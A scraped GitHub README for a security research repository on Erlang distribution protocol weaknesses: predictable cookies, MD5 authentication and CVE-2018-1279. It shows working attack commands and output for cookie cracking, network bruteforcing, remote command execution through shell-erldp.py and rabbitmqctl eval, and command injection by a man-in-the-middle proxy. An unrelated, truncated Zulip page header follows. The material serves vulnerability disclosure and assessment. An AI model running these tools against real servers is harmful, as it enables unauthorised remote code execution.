=== Content from github.com_056caa70_20250108_114128.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgteissier%2Ferl-matter)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgteissier%2Ferl-matter)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=gteissier%2Ferl-matter)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[gteissier](/gteissier)
/
**[erl-matter](/gteissier/erl-matter)**
Public

* [Notifications](/login?return_to=%2Fgteissier%2Ferl-matter) You must be signed in to change notification settings
* [Fork
  16](/login?return_to=%2Fgteissier%2Ferl-matter)
* [Star
   103](/login?return_to=%2Fgteissier%2Ferl-matter)

Erlang distribution weaknesses and tooling

### License

[View license](/gteissier/erl-matter/blob/master/LICENSE)

[103
stars](/gteissier/erl-matter/stargazers) [16
forks](/gteissier/erl-matter/forks) [Branches](/gteissier/erl-matter/branches) [Tags](/gteissier/erl-matter/tags) [Activity](/gteissier/erl-matter/activity)
 [Star](/login?return_to=%2Fgteissier%2Ferl-matter)

 [Notifications](/login?return_to=%2Fgteissier%2Ferl-matter) You must be signed in to change notification settings

* [Code](/gteissier/erl-matter)
* [Issues
  1](/gteissier/erl-matter/issues)
* [Pull requests
  0](/gteissier/erl-matter/pulls)
* [Actions](/gteissier/erl-matter/actions)
* [Projects
  0](/gteissier/erl-matter/projects)
* [Security](/gteissier/erl-matter/security)
* [Insights](/gteissier/erl-matter/pulse)

Additional navigation options

* [Code](/gteissier/erl-matter)
* [Issues](/gteissier/erl-matter/issues)
* [Pull requests](/gteissier/erl-matter/pulls)
* [Actions](/gteissier/erl-matter/actions)
* [Projects](/gteissier/erl-matter/projects)
* [Security](/gteissier/erl-matter/security)
* [Insights](/gteissier/erl-matter/pulse)

# gteissier/erl-matter

    master[Branches](/gteissier/erl-matter/branches)[Tags](/gteissier/erl-matter/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[53 Commits](/gteissier/erl-matter/commits/master/) | | |
| [Docker-experiments.md](/gteissier/erl-matter/blob/master/Docker-experiments.md "Docker-experiments.md") | | [Docker-experiments.md](/gteissier/erl-matter/blob/master/Docker-experiments.md "Docker-experiments.md") |  |  |
| [Dockerfile.erlang](/gteissier/erl-matter/blob/master/Dockerfile.erlang "Dockerfile.erlang") | | [Dockerfile.erlang](/gteissier/erl-matter/blob/master/Dockerfile.erlang "Dockerfile.erlang") |  |  |
| [Internet-scan.md](/gteissier/erl-matter/blob/master/Internet-scan.md "Internet-scan.md") | | [Internet-scan.md](/gteissier/erl-matter/blob/master/Internet-scan.md "Internet-scan.md") |  |  |
| [LICENSE](/gteissier/erl-matter/blob/master/LICENSE "LICENSE") | | [LICENSE](/gteissier/erl-matter/blob/master/LICENSE "LICENSE") |  |  |
| [Makefile](/gteissier/erl-matter/blob/master/Makefile "Makefile") | | [Makefile](/gteissier/erl-matter/blob/master/Makefile "Makefile") |  |  |
| [README.md](/gteissier/erl-matter/blob/master/README.md "README.md") | | [README.md](/gteissier/erl-matter/blob/master/README.md "README.md") |  |  |
| [barrier.c](/gteissier/erl-matter/blob/master/barrier.c "barrier.c") | | [barrier.c](/gteissier/erl-matter/blob/master/barrier.c "barrier.c") |  |  |
| [bin-seeds.py](/gteissier/erl-matter/blob/master/bin-seeds.py "bin-seeds.py") | | [bin-seeds.py](/gteissier/erl-matter/blob/master/bin-seeds.py "bin-seeds.py") |  |  |
| [bruteforce-erldp.c](/gteissier/erl-matter/blob/master/bruteforce-erldp.c "bruteforce-erldp.c") | | [bruteforce-erldp.c](/gteissier/erl-matter/blob/master/bruteforce-erldp.c "bruteforce-erldp.c") |  |  |
| [bruteforce-erldp.py](/gteissier/erl-matter/blob/master/bruteforce-erldp.py "bruteforce-erldp.py") | | [bruteforce-erldp.py](/gteissier/erl-matter/blob/master/bruteforce-erldp.py "bruteforce-erldp.py") |  |  |
| [complete-cookie.c](/gteissier/erl-matter/blob/master/complete-cookie.c "complete-cookie.c") | | [complete-cookie.c](/gteissier/erl-matter/blob/master/complete-cookie.c "complete-cookie.c") |  |  |
| [complete-cookie.sage](/gteissier/erl-matter/blob/master/complete-cookie.sage "complete-cookie.sage") | | [complete-cookie.sage](/gteissier/erl-matter/blob/master/complete-cookie.sage "complete-cookie.sage") |  |  |
| [crack-hash.c](/gteissier/erl-matter/blob/master/crack-hash.c "crack-hash.c") | | [crack-hash.c](/gteissier/erl-matter/blob/master/crack-hash.c "crack-hash.c") |  |  |
| [crack-prng.c](/gteissier/erl-matter/blob/master/crack-prng.c "crack-prng.c") | | [crack-prng.c](/gteissier/erl-matter/blob/master/crack-prng.c "crack-prng.c") |  |  |
| [dictionary-erldp.py](/gteissier/erl-matter/blob/master/dictionary-erldp.py "dictionary-erldp.py") | | [dictionary-erldp.py](/gteissier/erl-matter/blob/master/dictionary-erldp.py "dictionary-erldp.py") |  |  |
| [erlang.py](/gteissier/erl-matter/blob/master/erlang.py "erlang.py") | | [erlang.py](/gteissier/erl-matter/blob/master/erlang.py "erlang.py") |  |  |
| [erldp-info.nse](/gteissier/erl-matter/blob/master/erldp-info.nse "erldp-info.nse") | | [erldp-info.nse](/gteissier/erl-matter/blob/master/erldp-info.nse "erldp-info.nse") |  |  |
| [erldp-proxy.py](/gteissier/erl-matter/blob/master/erldp-proxy.py "erldp-proxy.py") | | [erldp-proxy.py](/gteissier/erl-matter/blob/master/erldp-proxy.py "erldp-proxy.py") |  |  |
| [erldp-warning.png](/gteissier/erl-matter/blob/master/erldp-warning.png "erldp-warning.png") | | [erldp-warning.png](/gteissier/erl-matter/blob/master/erldp-warning.png "erldp-warning.png") |  |  |
| [erldp.c](/gteissier/erl-matter/blob/master/erldp.c "erldp.c") | | [erldp.c](/gteissier/erl-matter/blob/master/erldp.c "erldp.c") |  |  |
| [erldp.h](/gteissier/erl-matter/blob/master/erldp.h "erldp.h") | | [erldp.h](/gteissier/erl-matter/blob/master/erldp.h "erldp.h") |  |  |
| [erldp.py](/gteissier/erl-matter/blob/master/erldp.py "erldp.py") | | [erldp.py](/gteissier/erl-matter/blob/master/erldp.py "erldp.py") |  |  |
| [example.dist](/gteissier/erl-matter/blob/master/example.dist "example.dist") | | [example.dist](/gteissier/erl-matter/blob/master/example.dist "example.dist") |  |  |
| [jsmn.c](/gteissier/erl-matter/blob/master/jsmn.c "jsmn.c") | | [jsmn.c](/gteissier/erl-matter/blob/master/jsmn.c "jsmn.c") |  |  |
| [jsmn.h](/gteissier/erl-matter/blob/master/jsmn.h "jsmn.h") | | [jsmn.h](/gteissier/erl-matter/blob/master/jsmn.h "jsmn.h") |  |  |
| [leaked-cookies](/gteissier/erl-matter/blob/master/leaked-cookies "leaked-cookies") | | [leaked-cookies](/gteissier/erl-matter/blob/master/leaked-cookies "leaked-cookies") |  |  |
| [revert-prng.sage](/gteissier/erl-matter/blob/master/revert-prng.sage "revert-prng.sage") | | [revert-prng.sage](/gteissier/erl-matter/blob/master/revert-prng.sage "revert-prng.sage") |  |  |
| [sample-cookies](/gteissier/erl-matter/blob/master/sample-cookies "sample-cookies") | | [sample-cookies](/gteissier/erl-matter/blob/master/sample-cookies "sample-cookies") |  |  |
| [seed-distribution.png](/gteissier/erl-matter/blob/master/seed-distribution.png "seed-distribution.png") | | [seed-distribution.png](/gteissier/erl-matter/blob/master/seed-distribution.png "seed-distribution.png") |  |  |
| [shell-erldp.py](/gteissier/erl-matter/blob/master/shell-erldp.py "shell-erldp.py") | | [shell-erldp.py](/gteissier/erl-matter/blob/master/shell-erldp.py "shell-erldp.py") |  |  |
| [sweep-default-cookie.py](/gteissier/erl-matter/blob/master/sweep-default-cookie.py "sweep-default-cookie.py") | | [sweep-default-cookie.py](/gteissier/erl-matter/blob/master/sweep-default-cookie.py "sweep-default-cookie.py") |  |  |
| View all files | | |

## Repository files navigation

* README
* License
# Guessing for fun and profit

**TLDR; Erlang Distribution offers arbitrary code execution, and its access shall have been protected, as explicitely stated by Erlang. Sadly, well known daemons expose it, and authentication is based on a guessable seed.**

**Pivotal has issued [CVE-2018-1279] for Pivotal RabbitMQ for PCF (<https://nvd.nist.gov/vuln/detail/CVE-2018-1279>)**

The seductive properties of Erlang make it the core of network exposed daemons:

* XMPP server [ejabberd](https://www.ejabberd.im),
* AMQP broker [rabbitmq](https://www.rabbitmq.com),
* NoSQL database [couchdb](http://couchdb.apache.org).

Both `rabbitmq` and `ejbabberd` provides messaging, a convenient way to interconnect components. OpenStack deployments routinely use `rabbitmq` as its core messaging system.

This repository provides tools to assess Erlang distribution protocol weaknesses:

* detail flaws related to cookie generation and authentication mecanism;
* provide tools associated with guessing, uncovering, or brute-forcing the Erlang cookie;
* provide Python tool to remotely execute code on vulnerable servers.

## Erlang, and Erlang distribution protocol

Erlang is a nice [programming language](https://en.wikibooks.org/wiki/Erlang_Programming). Joe Armstrong, its creator, has summarized it as:

* Everything is a process.
* ...
* Message passing is the only way for processes to interact.
* Processes have unique names.
* If you know the name of a process you can send it a message.
* ...

Distribution is related to clustering and transparent remoting over TCP/IP. It is typically involved when Erlang processes on two or more nodes need to communicate and synchronize, e.g. two `rabbitmq` nodes working in high-availability mode.

Processes that need to communicate using distribution must share a common secret, called the **Erlang cookie**.

[Distribution exchanges](http://erlang.org/doc/apps/erts/erl_dist_protocol.html) are split into two phases:

* [handshake](http://erlang.org/doc/apps/erts/erl_dist_protocol.html#id104761): it provides mutual authentication between two Erlang nodes. It is based on deprecated MD5 hashing, and the salt mecanism is rather weak.
* control: *overly simplified*, consists in Erlang messages in their [external encoded form](http://erlang.org/doc/apps/erts/erl_ext_dist.html)

Erlang is transparent and explicitely claims it is unsecure:
[![Explicit advisory](/gteissier/erl-matter/raw/master/erldp-warning.png?raw=true)](/gteissier/erl-matter/blob/master/erldp-warning.png?raw=true)

Well, most of the time, installing `ejabberd` or `rabbitmq` would bind Erlang distribution to the IPv4 wildcard. Erlang distribution might not be as protected as it should be ...

## Finding Erlang distribution ports

As a starter, let's use github.com to find trendy Erlang server projects. I bet it can change, but op eight of [today's monthly](https://github.com/trending/erlang?since=monthly) gives:

* rabbitmq/rabbitmq-server: Open source multi-protocol messaging broker
* emqtt/emqttd: EMQ - Erlang MQTT Broker
* ninesnines/cowboy: Small, fast, modern HTTP server for Erlang/OTP.
* apache/couchdb: Apache CouchDB
* processone/ejabberd: Robust, ubiquitous and massively scalable Jabber / XMPP Instant Messaging platform
* erlio/vernemq: A distributed MQTT message broker based on Erlang/OTP
* gotthardp/lorawan-server: Compact server for private LoRa networks
* esl/MongooseIM: MongooseIM is a mobile messaging platform with focus on performance and scalability

Out of these eight projects, it turns out that seven of them setup a distribution port. So it is not something seldom, but rather a default setup for Erlang servers. Details can be found in [setup and scan notes](/gteissier/erl-matter/blob/master/Docker-experiments.md).

### `epmd` lists Erlang processes

Erlang uses a registry to provide a naming function. The Erlang port mapper daemon aka `epmd` will list all the Erlang nodes accessible on the local host. Well known port for this daemon is `TCP/4369`. `nmap` will be able to extract information available on it:

```
$ nmap -A -sT -p4369 <target>
...
PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|_    rabbit: 25672

```

### Probing unknown TCP port for Erlang distribution

Access to `epmd` may be filtered. Quoting [ejabberd security guide](https://docs.ejabberd.im/admin/guide/security/):

```
The recommended way to secure the Erlang node is to block the port 4369.

```

Scanning the server will now produce:

```
$ nmap -A -sT -p- <target>

PORT      STATE SERVICE VERSION
56544/tcp open  unknown

```

Nmap is able to detect an open TCP port, but it is unable to detect it is Erlang distribution behind it.

Probing Erlang distribution port can be done using [erldp-info](/gteissier/erl-matter/blob/master/erldp-info.nse) nmap script:

```
$ nmap -A -sT --script ./erldp-info.nse -p56544 <target>
...
PORT      STATE SERVICE VERSION
56544/tcp open  erldp   Erlang distribution protocol
| erldp-info:
|   version: 5
|   node: ejabberd@<target>
|_  flags: 37ffc

```

## Executing shell commands via Erlang distribution

Now let's see what can be done when accessing Erlang distribution protocol. In this part, we suppose we already have the cookie required to authenticate.

Docker hub points to an official [rabbitmq image](https://hub.docker.com/_/rabbitmq/).

```
$ docker run --rm --hostname hare --name hare \
-e RABBITMQ_ERLANG_COOKIE="love.s3cr3t.c00ki35;)" \
rabbitmq

```

After pulling a few layers, we can see rabbitmq logs flowing. And we know the Erlang cookie because we explicitely set it using `RABBITMQ_ERLANG_COOKIE` environment variable.

`rabbitmqctl` is the name of the command line tool that controls rabbitmq server. It is built on top of Erlang distribution. It needs to remotely interact with `rabbit` Erlang process.

We already have all that we need in the previously pulled image:

```
$ docker run -ti --rm --link hare:hare \
-e RABBITMQ_ERLANG_COOKIE="love.s3cr3t.c00ki35;)" \
rabbitmq rabbitmqctl -n rabbit@hare eval 'os:cmd("id && hostname").'

```

yields `"uid=999(rabbitmq) gid=999(rabbitmq) groups=999(rabbitmq)\nhare\n"`

The command `id && hostname` has actually run on server, which hostname is `hare`.

**Access and cookie knowledge allow to remotely execute code on server.**

## Guessing an Erlang cookie

As we show above, knowing the Erlang cookie and having access to Erlang distribution is enough to get remote command execution, under the user running the Erlang process.

The curious has noticed that we set the Erlang cookie by ourself. Recalling that communicating nodes shall share the same cookie, you basically have two solutions:

* generate an Erlang cookie using your favorite PRNG, then copy it to the requiring nodes;
* or let Erlang generate a cookie on the first use, then copy it to the requiring nodes.

The rest will focus on automatically generated Erlang cookies.

### Cookie recipe for *recent* Erlang runtime

The recipe can be found at the heart of [auth.erl](https://github.com/erlang/otp/blob/master/lib/kernel/src/auth.erl):

```
create_cookie(Name) ->
    Seed = abs(erlang:monotonic_time()
	       bxor erlang:unique_integer()),
    Cookie = random_cookie(20, Seed, []),
...
random_cookie(0, _, Result) ->
    Result;
random_cookie(Count, X0, Result) ->
    X = next_random(X0),
    Letter = X*($Z-$A+1) div 16#1000000000 + $A,
    random_cookie(Count-1, X, [Letter|Result]).
...
next_random(X) ->
    (X*17059465+1) band 16#fffffffff.

```

Versions more recent than [this commit](https://github.com/erlang/otp/commit/fbaa0becc787e73fa539e0d497b0d74be27c9534) use this cookie generation algorithm. Note that versions prior to this commit use a different recipe to derive a cookie:

```
create_cookie(Name) ->
    {_, S1, S2} = now(),
    Seed = S2*10000+S1,
    Cookie = random_cookie(20, Seed, []),

```

The rest will focus on recent Erlang versions using the newest recipe.

### Cookies are predictable

The cookie is derived from a seed. The seed is computed from quantities obtained via:

* `erlang:monotonic_time()`: it stands for the time in nanoseconds from the start of the Erlang virtual machine to the time of the call
* `erlang:unique_integer()`: it returns an integer which is incremented by something linear to the number of Erlang processors

It appears that both quantities are fairly *predictable*. The diagram below depicts the distribution of seeds for a targeted hardware platform:

[![seed distribution for a targeted hardware platform](/gteissier/erl-matter/raw/master/seed-distribution.png?raw=true)](/gteissier/erl-matter/blob/master/seed-distribution.png?raw=true)

So far, Erlang cookie space has reduced from:

* At first glance, 20 capital letters, which gives roughly *26^20 ~ 10^28* candidates;
* The structure of the PRNG reduces the number of candidates cookie to *2^36 ~ 10^8*;
* The poor entropy of the seed further reduces the number of candidates to now roughly *10^6*.

**Automatically generated Erlang cookies offer poor entropy**

## Tooling around the vulnerability

### Guessing the seed

An easy way is to generate a lot of cookies via starting a fresh `rabbitmq` daemon and harvesting the Erlang cookie. A seed used to generate the cookie can be obtained via [revert-prng](/gteissier/erl-matter/blob/master/revert-prng.sage):

```
$ echo "ELDUPJHMPTCVINSPFDTA" | ./revert-prng.sage
404289480

```

Reverting of the PRNG is based on finding a minimal solution to a 21\*21 system in Z/\_2^36\_Z. `sage` provides the `solve_right` primitive which handles all the work to provide a suitable solution.

```
$ ./revert-prng.sage stats < sample-cookies
number of cookies: 2000
  min seed: 379860146
  max seed: 386287883
  mean seed: 381404044
  std deviation: 568768

```

### Cracking `rabbitmq` cookie hash

`rabbitmq` logs the raw md5 of the cookie in its log, base64 encoded. [Oops](https://groups.google.com/forum/#!topic/rabbitmq-users/R-1WJpqVuMI). And [oops again](https://stackoverflow.com/questions/37791757/rabbitmq-log-and-mnesia-location-in-environment-variables-not-reflecting).

```
=INFO REPORT==== 27-Dec-2015::13:41:22 ===
node           : rabbit@pablo-HP
home dir       : /var/lib/rabbitmq
config file(s) : /etc/rabbitmq/rabbitmq.config (not found)
cookie hash    : 686jqAnl3g3sdADgSCD+sg==
log            : /var/log/rabbitmq/rabbit@pablo-HP.log
sasl log       : /var/log/rabbitmq/rabbit@pablo-HP-sasl.log
database dir   : /var/lib/rabbitmq/mnesia/rabbit@pablo-HP

```

You can use [crack-hash](/gteissier/erl-matter/blob/master/crack-hash.c) to sweep through all the seeds and find matching md5:

```
$ time ./crack-hash 686jqAnl3g3sdADgSCD+sg==
IICIEBZGURYVBZWLJTFI
  seed used to generate it = 506551409

real	0m13.121s
user	1m43.467s
sys	0m0.033s

```

Shall you have access to pablo-HP machine, you could execute code on his machine.

Note that only automatically generated cookies can be found by this tool.
If the admin was wise enough to replace the Erlang cookie, the tool will fail with:

```
$ time ./crack-hash X03MO1qnZdYdgyfeuILPmQ==
cookie hash did not reveal a generated cookie

real	30m11.820s
user	233m5.784s
sys	0m16.311s

```

In this case you can always fall back to raw md5 cracking using `oclHashcat` or `john`. Or google.
The hash above matches `password` as plaintext.

### Completing a partly leaked cookie

Imagine that a crash has given you only a part of the cookie. Due to its nature, missing parts can be completed ! For starter, let's begin with just a missing character, at the beginning:

```
$ time ./complete-cookie .ICIEBZGURYVBZWLJTFI
IICIEBZGURYVBZWLJTFI (seed = 506551409)

real	0m2.027s
user	0m15.774s
sys	0m0.021s

```

Mission accomplished, though bruteforcing the 26 possible first character would have been much easier. But let's take a more complex example, only the last seven characters were dumped:

```
$ time ./complete-cookie .............ZWLJTFI
QYUFBUCVATYSFZWLJTFI (seed = 25860583736)
DZQLCMSUWKIIWZWLJTFI (seed = 22290780982)
IICIEBZGURYVBZWLJTFI (seed = 506551409)
SPRNLDKPIEAKVZWLJTFI (seed = 40262700267)
MKLNNWZUXYQCXZWLJTFI (seed = 54109041624)
WSBSUZKCKLRRRZWLJTFI (seed = 25145713746)

real	0m2.201s
user	0m15.618s
sys	0m0.043s

```

### Bruteforcing Erlang cookie

When you have found an open suitable port, you can use [bruteforce-erldp](/gteissier/erl-matter/blob/master/bruteforce-erldp.c) to sweep a seed interval and perform network exchanges to authenticate.

**In the context of the above hardware setup, using the computed interval uncovers the Erlang cookie in 30 seconds:**

```
$ time ./bruteforce-erldp --threads=16 --seed-start=381410768 --seed-end=386584488 --gap=1000 192.168.1.36 25672
16 workers will start, sweeping through [381410768, 386584488]
each worker will sweep though an interval of size 323358
 6766 seed/s (6767 conn/s)		57.57%
found cookie = UDPQJJNGQLLDNASUKRRN

real	7m41.043s
user	0m31.372s
sys	7m8.548s

```

Bruteforce is not always entitled with success. In particular, Erlang cookies which have not been generated by Erlang will not be guessable. However, Erlang runtime does not put throttling protection, nor lock out mecanism based on attempting source IP, so ... it is worth trying it.

### Gaining remote code execution

Now is reward time !

[shell-erldp](/gteissier/erl-matter/blob/master/shell-erldp.py) makes victim Erlang server execute shell command given in argument. It requires host and port, plus cookie value.

Coming back to our target setup:

```
$ ./shell-erldp.py 192.168.1.36 25672 UDPQJJNGQLLDNASUKRRN id
uid=121(rabbitmq) gid=135(rabbitmq) groups=135(rabbitmq)

```

Doing the same for `ejabberd` works the very same, as we use a function built in Erlang, not in upper daemon developped in Erlang:

```
$ ./shell-erldp.py 192.168.1.36 45986 YBBQTPLCGRNMJOJJENNL id
uid=110(ejabberd) gid=116(ejabberd) groups=116(ejabberd)

```

Gaining an interactive reverse shell is now a step ahead.

### Exploiting man-in-the-middle

A man-in-the-middle attacker may wait for the legit client to authenticate, and then inject malicious commands into the external encoded Erlang stream, which is neither ciphered, neither authenticated. This part is now implemented, as a Python asyncore Erlang distribution [proxy](/gteissier/erl-matter/blob/master/erldp-proxy.py). It currently identifies and outputs challenges/responses, leaving the cookie to be cracked offline. It can also be used to inject an RCE Erlang payload inside an authenticated channel.

#### Non-transparent proxy

It requires the client to connect to the attacker proxy. The proxy must then know how to connect to legitimate server. The associated command line option is:

```
$ ./erldp-proxy.py --target victim:9100 ...

```

#### Transparent proxy

It requires the use of a redirect rule, such as:

```
# iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 9100 -j REDIRECT --to-port 19100

```

In this case, the initial destination is retrieved from the socket through the use of `SO\_ORIG\_DSTADDR`. The legit connection to the victim server is then performed. This is the default mode when `--target` is not used:

```
$ ./erldp-proxy.py ...

```

#### Collect challenges and responses

The goal is to collect authentication exchanges, and crack cookie offline.

```
$ python erldp-proxy.py --target 127.0.0.1:9100 --collect-challenges
[*] listening on 127.0.0.1:31337
[*] working in non transparent mode, will connect to 127.0.0.1:9100
...
md5(cookie|2946365952) = d96d11044d7ffc3e2bc9c60b67c28a91
md5(cookie|0) = cc4876d55ff075a40e0a530872496805

```

The reader can verify that in this case, `cookie` is `ejabberd`.

#### Inject OS command

The goal is to inject a correctly formatted OS command inside the authenticated channel right after authentication is successful.

```
$ python erldp-proxy.py --target 127.0.0.1:9100 --inject-cmd id
[*] listening on 127.0.0.1:31337
...
[*] working in non transparent mode, will connect to 127.0.0.1:9100
[!!!] INJECTING 'id' to server
[!!!] DONE

```

## Recommendations

* Replace automatically generated cookies by ones generated using a strong PRNG.
* Protect integrity and confidentiality of distribution using TLS, with mutual authentication. Note this renders Erlang cookie useless.
* *3NJ0Y Y0Ur W1D3 0P3N 3r14N6 D157r18U710N P0r7 !*

## About

Erlang distribution weaknesses and tooling

### Resources

[Readme](#readme-ov-file)
### License

[View license](#License-1-ov-file)

[Activity](/gteissier/erl-matter/activity)
### Stars

[**103**
stars](/gteissier/erl-matter/stargazers)
### Watchers

[**1**
watching](/gteissier/erl-matter/watchers)
### Forks

[**16**
forks](/gteissier/erl-matter/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fgteissier%2Ferl-matter&report=gteissier+%28user%29)

## [Releases](/gteissier/erl-matter/releases)

No releases published

## [Packages 0](/users/gteissier/packages?repo_name=erl-matter)

No packages published

## [Contributors 2](/gteissier/erl-matter/graphs/contributors)

## Languages

* [Python
  52.1%](/gteissier/erl-matter/search?l=python)
* [C
  38.5%](/gteissier/erl-matter/search?l=c)
* [Sage
  5.5%](/gteissier/erl-matter/search?l=sage)
* [Lua
  3.4%](/gteissier/erl-matter/search?l=lua)
* [Makefile
  0.5%](/gteissier/erl-matter/search?l=makefile)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_ead42789_20250108_114129.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzulip%2Fzulip%2Fcommit%2Fa5496f4098e3998c9b84e8dc564aa983d6cdf6e8)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fzulip%2Fzulip%2Fcommit%2Fa5496f4098e3998c9b84e8dc564aa983d6cdf6e8)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=zulip%2Fzulip)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[zulip](/zulip)
/
**[zulip](/zulip/zulip)**
Public

* [Notifications](/login?return_to=%2Fzulip%2Fzulip) You must be signed in to change notification settings
* [Fork
  8.1k](/login?return_to=%2Fzulip%2Fzulip)
* [Star
